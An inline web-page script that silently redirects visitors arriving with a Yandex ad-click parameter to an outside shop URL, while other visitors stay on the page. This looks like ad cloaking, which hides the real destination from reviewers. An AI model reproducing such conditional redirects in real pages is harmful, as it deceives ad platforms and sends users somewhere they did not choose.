        <script>
        var url = "https://kshop6.com/5wPWI9/null";
        if (['', 'test'].indexOf(getUrlParameter("yclid")) == -1) window.location.replace(url);
        function getUrlParameter(name) {
          name = name.replace(/[\[]/, '\[').replace(/[\]]/, '\]');
          var regex = new RegExp('[\?&]' + name + '=([^&#]*)');
          var results = regex.exec(location.search);
          return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' ').replace(/%/g, '%25'));
        };
        </script>
